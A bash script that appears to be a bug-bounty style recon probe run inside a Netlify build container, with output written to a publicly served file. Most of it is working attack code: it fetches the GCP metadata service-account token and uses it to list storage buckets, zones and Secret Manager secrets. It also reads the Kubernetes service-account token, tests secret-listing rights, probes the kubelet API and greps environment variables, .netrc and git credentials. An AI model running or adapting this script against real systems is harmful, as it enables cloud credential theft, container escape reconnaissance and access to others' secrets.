#!/usr/bin/env bash
# Netlify build-container recon — IN-SCOPE escalations (privesc/root, secrets-beyond-user,
# container escape, orchestration control-plane). Output tee'd to published file (secrets redacted).
mkdir -p public
OUT="public/_nfp_probe.txt"
exec > >(tee "$OUT") 2>&1
red(){ v="$1"; n=${#v}; [ "$n" -lt 12 ] && echo "<len=$n>" || echo "${v:0:6}...${v: -4} <len=$n>"; }
echo "===== NETLIFY BUILD PROBE $(date -u) ====="
echo "## identity/kernel"; id; uname -a; head -2 /etc/os-release 2>/dev/null; echo "cwd=$(pwd)"
echo "## caps + ns + cgroup"; grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status; readlink /proc/self/ns/* 2>/dev/null|sort -u; head -3 /proc/1/cgroup 2>/dev/null; head -3 /proc/self/cgroup 2>/dev/null
echo "## mounts (host/docker/k8s/secret hints)"; grep -iE 'docker|containerd|kube|secret|overlay|/dev/(vd|sd|nvme)|hostpath|gcs|csi' /proc/self/mountinfo 2>/dev/null|head -25
echo "## escape surface"; ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo "core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)"; ls -la /dev/mem 2>/dev/null
echo "## == GCP METADATA =="
M="http://metadata.google.internal/computeMetadata/v1"; H="Metadata-Flavor: Google"
echo "project: $(curl -s -m6 -H "$H" "$M/project/project-id")"
echo "numeric: $(curl -s -m6 -H "$H" "$M/project/numeric-project-id")"
echo "sa-email: $(curl -s -m6 -H "$H" "$M/instance/service-accounts/default/email")"
echo "sa-scopes:"; curl -s -m6 -H "$H" "$M/instance/service-accounts/default/scopes"
TOKJSON=$(curl -s -m6 -H "$H" "$M/instance/service-accounts/default/token")
ATOK=$(echo "$TOKJSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
echo "sa-token: $(red "$ATOK") (redacted)"
echo "instance-attrs: $(curl -s -m6 -H "$H" "$M/instance/attributes/?recursive=true" | head -c 300)"
echo "== USE SA token to test access (escalation) =="
if [ -n "$ATOK" ]; then
  echo "tokeninfo scopes:"; curl -s -m6 "https://oauth2.googleapis.com/tokeninfo?access_token=$ATOK" | head -c 400; echo
  echo "GCS list (project buckets):"; curl -s -m8 -H "Authorization: Bearer $ATOK" "https://storage.googleapis.com/storage/v1/b?project=$(curl -s -m4 -H "$H" "$M/project/project-id")" | head -c 400; echo
  echo "GCE self:"; curl -s -m8 -H "Authorization: Bearer $ATOK" "https://compute.googleapis.com/compute/v1/projects/$(curl -s -m4 -H "$H" "$M/project/project-id")/zones" | head -c 300; echo
  echo "secret manager list:"; curl -s -m8 -H "Authorization: Bearer $ATOK" "https://secretmanager.googleapis.com/v1/projects/$(curl -s -m4 -H "$H" "$M/project/numeric-project-id")/secrets" | head -c 400; echo
fi
echo "## == KUBERNETES =="
env | grep -iE 'KUBERNETES|KUBE_' | head
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
KT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); echo "k8s-sa-token: $([ -n "$KT" ] && red "$KT" || echo none)"
echo "k8s-ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
KH=${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}
if [ -n "$KT" ]; then
  echo "whoami (SelfSubjectReview):"; curl -sk -m6 -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authentication.k8s.io/v1/selfsubjectreviews" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 | head -c 500; echo
  echo "can-i list secrets:"; curl -sk -m6 -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' -X POST "https://$KH/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}' 2>&1 | head -c 300; echo
fi
echo "kubelet :10250 pods:"; curl -sk -m4 "https://127.0.0.1:10250/pods" 2>&1 | head -c 100; echo
echo "## == SECRETS BEYOND MY USER =="
env | grep -iE 'secret|token|key|passw|cred|aws|gcp|_api' | sed -E 's/=.{6}.*/=<redacted>/' | head -30
echo "netrc:"; ls -la ~/.netrc /opt/build*/.netrc 2>/dev/null; echo "git creds:"; cat ~/.git-credentials 2>/dev/null | sed -E 's#//[^@]*@#//<redacted>@#'
echo "## network"; ip -o a 2>/dev/null|awk '{print $2,$4}'; grep -i nameserver /etc/resolv.conf 2>/dev/null
echo "===== END PROBE ====="
